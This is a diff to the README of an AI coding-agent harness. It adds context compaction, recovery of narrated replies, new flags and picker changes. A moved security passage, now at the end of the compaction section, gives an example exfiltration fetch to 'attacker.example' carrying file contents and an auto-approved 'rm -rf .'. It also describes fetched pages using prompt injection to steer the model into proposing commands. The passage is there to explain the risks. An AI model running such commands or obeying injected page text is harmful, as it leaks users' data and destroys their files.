@@ -213,6 +213,14 @@ and asks again, up to `--max-retries` (default 3). After that it gives up and
 rolls the failed exchange out of context, so a bad reply is not left behind as an
 example to imitate. Retries are always on; `/debug` only changes what you see.
 
+One failure is recovered instead of retried: a sentence of narration in front of
+an otherwise valid element. It is the commonest slip by a wide margin and the
+least interesting — the action was right — so the prose is dropped, the action
+runs, and the transcript says how much was dropped. Nothing else is forgiven: the
+element behind the prose still has to parse on its own, and trailing content, two
+elements, an invented result, or an attribute the element does not take are all
+rejected as before. `--strict-replies` turns the recovery off.
+
 ## Slash commands
 
 Commands are handled locally and never sent to the model.
@@ -223,6 +231,7 @@ Commands are handled locally and never sent to the model.
 | `/auto` | Toggle running actions without the approval modal (see [Sandboxing](#sandboxing)) |
 | `/plan [task]` | Toggle plan mode; with a task, start planning it (see [Plan mode](#plan-mode)) |
 | `/clear` | Clear the conversation, keeping the system prompt |
+| `/compact` | Summarise the older part of the conversation to free context (see [Context compaction](#context-compaction)) |
 | `/save [name]` | Save the session now (auto-save is always on; this also names it) |
 | `/load [name]` | Load a saved session; `/load` with no name opens a picker modal |
 | `/rename <name>` | Rename the current session (the name it loads under) |
@@ -377,41 +386,6 @@ It is bounded by `--max-turn-bytes` as well, because round-trips are the wrong
 unit for the damage a few whole-file reads can do: a handful of them can crowd
 out the context window well inside the round-trip budget.
 
-**This confines the filesystem; it is not a security boundary against a
-determined attacker.** Network is on, so any command you approve can send
-anything it can read. Command output is also sent to OpenRouter, which means
-reading a secret leaks it even with no network in the command itself — the `.env`
-deny closes the obvious case, and the denylist is not exhaustive.
-
-Two things `<ai-harness-fetch>` specifically does **not** do, both worth knowing
-before you leave it auto-approved:
-
-- **It does not stop exfiltration.** An auto-approved read followed by an
-  auto-approved fetch of `https://attacker.example/?d=<file contents>` moves
-  data off the machine with nobody asked. The address rules do not help here —
-  the attacker's host is an ordinary public one. This is a real reduction in
-  containment versus routing the network step through `curl`, where you would
-  approve it. `--confirm-fetch` puts that approval back.
-- **It does not bound what a page says.** Fetched text lands in the model's
-  context, and a page can try to instruct it. The result is labelled as
-  untrusted when it is handed over, but what actually contains this is
-  structural: by default shell, write, and edit still require approval, so a
-  page can persuade the model to *propose* something, not to do it. **This is
-  the containment `--auto-approve` removes** — see below.
-
-What auto-approve costs, stated plainly: the modal is the structural check in the
-paragraph above. With it off, a fetched page that talks the model into proposing a
-command gets that command run, inside the sandbox, with nobody asked. The sandbox
-still bounds *where* a command can reach; it never bounded *whether* it runs —
-that was the modal's job. Nor does the sandbox protect the working directory
-itself: it is the root commands are confined *to*, so an auto-approved `rm -rf .`
-is inside the boundary, not outside it. Use the mode on a tree you can restore
-from git, and prefer `--confirm-fetch` alongside it if the task involves reading
-the web.
-
-Non-macOS platforms fail closed at startup rather than running commands
-unsandboxed.
-
 ## Plan mode
 
 `/plan` (or `/plan add a --json flag`, which enters the mode and starts on that
@@ -516,6 +490,95 @@ Give it extra guidance (appended to the protocol contract, never replacing it):
 cargo run -- --system "Prefer ripgrep over grep."
 ```
 
+## Context compaction
+
+Those bounds keep one turn from running away. They do nothing about the slower
+problem: the whole conversation is resent every turn, so a long session walks
+steadily toward the model's context limit and then stops dead. `/clear` was the
+only escape, and it throws the session away to save it.
+
+At **80% of the model's context window** the older part of the conversation is
+shortened instead. `/compact` does it on demand, and `--compact-at` moves the
+threshold — `0` turns the automatic pass off and leaves the command.
+
+Two passes, because they discard different things:
+
+- The **mechanical** pass throws away tool *output* — the contents of files
+  read, the stdout of commands, the hits from a search — and leaves every user
+  prompt and assistant reply byte for byte. That is where the bulk is, and it
+  takes no judgement: a 64 KB read result becomes a ~220-byte stub that still
+  says `path: src/app.rs`, which is all a model needs to read it again.
+- The **model** pass then summarises what is left into prose, in a separate
+  request that is not sent the protocol contract — it is asked for prose and
+  told outright that an element would be rejected. That is the only way to
+  compress *reasoning* rather than data.
+
+The most recent 64 KB is kept verbatim regardless, so the file you are working on
+now survives whole, and the cut is nudged back to a user prompt so the tail opens
+on a turn rather than halfway through a tool loop. If the summarising request
+fails, the mechanical pass stands alone — and in that case the prefix is never
+dropped, because deleting the user's own words with nothing in their place is
+the one outcome worth refusing outright.
+
+When the catalog does not know the model — it has not loaded, the fetch failed,
+or you named a model it has never heard of — there is no window to take 80% of,
+so the trigger falls back to a fixed 384 KB of conversation. The notice says
+which measure fired, so `168k of 200k tokens` and `380 KB of conversation` are
+distinguishable at a glance.
+
+If the provider rejects a request as too long anyway, that is answered **once**:
+the harness compacts and sends the same request again. A second overflow in the
+same turn gives up and says so rather than looping; only a new prompt re-arms it.
+
+Nothing is lost when this happens. The conversation as it stood goes to
+`compaction-001.json` in the session's folder, numbered so a session that
+compacts several times keeps every one of them:
+
+```
+.ai_harness/sessions/<name>/
+├── session.json
+├── compaction-001.json
+└── compaction-002.json
+```
+
+Nothing reads those back yet — they are there so the detail a summary discarded
+is still on disk if you want it.
+
+**This confines the filesystem; it is not a security boundary against a
+determined attacker.** Network is on, so any command you approve can send
+anything it can read. Command output is also sent to OpenRouter, which means
+reading a secret leaks it even with no network in the command itself — the `.env`
+deny closes the obvious case, and the denylist is not exhaustive.
+
+Two things `<ai-harness-fetch>` specifically does **not** do, both worth knowing
+before you leave it auto-approved:
+
+- **It does not stop exfiltration.** An auto-approved read followed by an
+  auto-approved fetch of `https://attacker.example/?d=<file contents>` moves
+  data off the machine with nobody asked. The address rules do not help here —
+  the attacker's host is an ordinary public one. This is a real reduction in
+  containment versus routing the network step through `curl`, where you would
+  approve it. `--confirm-fetch` puts that approval back.
+- **It does not bound what a page says.** Fetched text lands in the model's
+  context, and a page can try to instruct it. The result is labelled as
+  untrusted when it is handed over, but what actually contains this is
+  structural: by default shell, write, and edit still require approval, so a
+  page can persuade the model to *propose* something, not to do it. **This is
+  the containment `--auto-approve` removes** — see below.
+
+What auto-approve costs, stated plainly: the modal is the structural check in the
+paragraph above. With it off, a fetched page that talks the model into proposing a
+command gets that command run, inside the sandbox, with nobody asked. The sandbox
+still bounds *where* a command can reach; it never bounded *whether* it runs —
+that was the modal's job. Nor does the sandbox protect the working directory
+itself: it is the root commands are confined *to*, so an auto-approved `rm -rf .`
+is inside the boundary, not outside it. Use the mode on a tree you can restore
+from git, and prefer `--confirm-fetch` alongside it if the task involves reading
+the web.
+
+Non-macOS platforms fail closed at startup rather than running commands
+unsandboxed.
+
 ## Cost
 
 The status bar carries the current context size and a running token total once a
@@ -549,9 +612,13 @@ money precisely when it is going wrong.
 
 Other flags: `--workdir` sets the sandbox root (default: cwd),
 `--command-timeout` the per-command limit in seconds, `--max-iterations` and
-`--max-turn-bytes` the agentic loop bounds, `--confirm-reads` puts file reads and
+`--max-turn-bytes` the agentic loop bounds, `--compact-at` the share of the
+context window that triggers [compaction](#context-compaction) (`0` disables it),
+`--confirm-reads` puts file reads and
 searches behind the approval modal along with everything else, and
 `--confirm-fetch` does the same for URL fetches.
+`--strict-replies` rejects a reply that narrates before its element rather than
+dropping the narration.
 `--auto-approve` goes the other way and removes the modal entirely — read
 [Sandboxing](#sandboxing) before using it. Every flag also has an environment
 variable (`AI_HARNESS_AUTO_APPROVE`, and so on).
@@ -594,9 +661,10 @@ Typing goes to the free-text row **only while it is focused**, so a keystroke
 aimed at a highlighted choice cannot vanish into a buffer you cannot see. Choices
 are clickable too.
 
-The `/model` picker works the same way — it owns the keyboard, its query row
-takes the prompt's editing keys, and rows are clickable — except that typing
-always goes to the query, since narrowing the list is the only thing to do there.
+The `/model` and `/load` pickers work the same way — each owns the keyboard, its
+query row takes the prompt's editing keys, and rows are clickable — except that
+typing always goes to the query, since narrowing the list is the only thing to do
+there.
 
 Mouse wheel scrolls the transcript. Scrolling up detaches the view; it re-attaches
 to the bottom once you scroll back down (or press `End`).
@@ -655,6 +723,7 @@ than squeezing the conversation out of view.
 | `src/exec.rs` | Running commands: streamed output, idle timeout, output caps |
 | `src/files.rs` | Resolving and reading files for `<ai-harness-read>` |
 | `src/search.rs` | The confined tree walk behind `<ai-harness-grep>` and `<ai-harness-glob>` |
+| `src/compact.rs` | Shortening a conversation that no longer fits |
 | `src/fetch.rs` | URL policy, fetching, and HTML-to-text for `<ai-harness-fetch>` |
 | `src/diff.rs` | Line-by-line diffs of writes and edits, bounded for storage |
 | `src/highlight.rs` | Language detection and tokenising for code blocks |
@@ -760,13 +829,15 @@ never overwrite each other.
   under a new name. Both start identical and diverge from the fork point; the
   original is preserved to `/load` back.
 - `/save [name]` — save now and, with a name, adopt it going forward.
-- `/load <name>` — restore a session. `/load` with no name opens a picker: choose
-  with `↑`/`↓` or the mouse, `Enter` or click to load, `Esc` to cancel. Each entry
-  shows its name, the model it was held with (right of the name — loading switches
-  to it), and the session's last few lines, so the list can be read rather than
-  navigated — names are timestamps until you `/rename` them, and a timestamp says
-  nothing about what a session was. Sessions saved before previews existed show a
-  bare name until their next save.
+- `/load <name>` — restore a session. `/load` with no name opens a picker: type to
+  filter, choose with `↑`/`↓` or the mouse, `Enter` or click to load, `Esc` to
+  cancel. Each entry shows its name, the model it was held with (right of the
+  name — loading switches to it), and the session's last few lines, so the list
+  can be read rather than navigated — names are timestamps until you `/rename`
+  them, and a timestamp says nothing about what a session was. Sessions saved
+  before previews existed show a bare name until their next save. Typing narrows
+  on the name and the model, matching the `/model` picker: every whitespace-
+  separated term must appear, so terms narrow rather than widen.
 - `/clear` — wipe the conversation, **including its saved file** (it is
   overwritten to the cleared state). Use `/fork` first if you want to keep it.
   The model you are on is session state, not conversation state, so it survives.
